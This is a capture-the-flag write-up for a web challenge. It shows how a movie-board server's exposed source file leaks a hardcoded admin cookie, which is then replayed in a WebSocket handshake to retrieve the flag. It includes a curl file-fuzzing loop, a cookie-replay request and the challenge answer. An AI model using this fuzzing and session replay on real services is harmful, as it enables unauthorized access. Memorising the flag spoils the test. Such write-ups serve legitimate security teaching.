# Grave Encounters — Jerry's Leaks — Writeup

**Category:** Web / Network Services
**Challenge:** "The DEADFACE crew set up a discussion board to pick movies for
their Halloween marathon. Their sysadmin, Jerry, was in a hurry, and left more
exposed than a movie board should. Find what Jerry leaked and ask the server
nicely for its secret."
**Target:** `170.187.156.131` (web board on **:8080**, WebSocket on **:8765**;
port 8443 is a different challenge — off limits)
**Flag:** `deadface{serve_me_up_a_flag}`

## Summary

A static movie board on port 8080 leaks its own backend source code
(`/server.py`), which contains a privileged session cookie. Replaying that
cookie in a WebSocket handshake to the board's member-tools server on port 8765
promotes the session to admin, and the `get_flag` command hands over the flag.

## Recon

Port 80 redirects to a dead 443; the board itself lives on **:8080** —
"Grave Encounters :: Halloween Movie Marathon", a static HTML lineup served by
`SimpleHTTP/0.6 Python/3.13.12`. The footer does the OSINT for us:

```
Grave Encounters v0.3 · built in a hurry by jerry · happy haunting
```

The page's inline JS leaks the real attack surface — a WebSocket backend:

```js
const WS_URL = (location.protocol === "https:" ? "wss://" : "ws://")
             + location.hostname + ":8765";
...
ws.onopen = () => { ws.send(JSON.stringify({cmd:"list"})); };
```

## Talking to the WebSocket

A quick raw-WebSocket client (HTTP `Upgrade` handshake, masked text frames)
speaks JSON to `ws://170.187.156.131:8765`:

```
-> {"cmd":"list"}    <- {"type": "movies", "movies": [{"title": "Hereditary", ...
-> {"cmd":"status"}  <- {"type": "status", "admin": false}     <-- interesting
-> {"cmd":"vote"}    <- {"error": "this board is read-only"}
-> {"cmd":"get_flag"}<- {"error": "forbidden: admin session required"}
```

So there is an admin state and a flag command gated behind a session.

## Jerry's leak

A light file fuzz against the static server (no port scanning, no 8443) turns
up the sysadmin's mistake:

```
$ for f in admin backup server.py spooky_board.log ...; do curl -so /dev/null
    -w "%{http_code} /$f\n" http://170.187.156.131:8080/$f; done
200 /server.py
```

`http://170.187.156.131:8080/server.py` serves the entire board source:

```python
FLAG1 = "deadface{serve_me_up_a_flag}"
ADMIN_COOKIE_VALUE = "s3ssion=adm1n-3f9a7c21b8d4e6f0"  # privileged session (from NFS log)

def cookie_of(ws):
    return ws.request.headers.get("Cookie", "")

async def handler(ws):
    is_admin = ADMIN_COOKIE_VALUE in cookie_of(ws)
    ...
        elif cmd == "get_flag":
            if is_admin:
                await ws.send(json.dumps({"type": "flag", "flag": FLAG1}))
```

Admin is decided purely by a `Cookie:` header substring match —
`s3ssion=adm1n-3f9a7c21b8d4e6f0`.

## Asking nicely

Reconnect to the WebSocket with the leaked cookie in the handshake, then run
`get_flag`:

```python
req = ("GET / HTTP/1.1\r\nHost: 170.187.156.131:8765\r\n"
       "Upgrade: websocket\r\nConnection: Upgrade\r\n"
       f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
       "Cookie: s3ssion=adm1n-3f9a7c21b8d4e6f0\r\n\r\n")
```

```
-> {"cmd":"status"}    <- {"type": "status", "admin": true}
-> {"cmd":"get_flag"}  <- {"type": "flag", "flag": "deadface{serve_me_up_a_flag}"}
```

## Flag

```
deadface{serve_me_up_a_flag}
```

## Lessons

- Source-code disclosure beats brute force: one 200 on `/server.py` gave the
  auth model, the privileged cookie, and the flag command in a single request.
- WebSocket services are unauthenticated by default — the handshake's
  application-level `Cookie` header *was* the entire security model, and
  cookies are trivially replayable.
- Client-side JS is reconnaissance: the board HTML advertised the port, the
  protocol, and the command schema for a service that has no other front door.
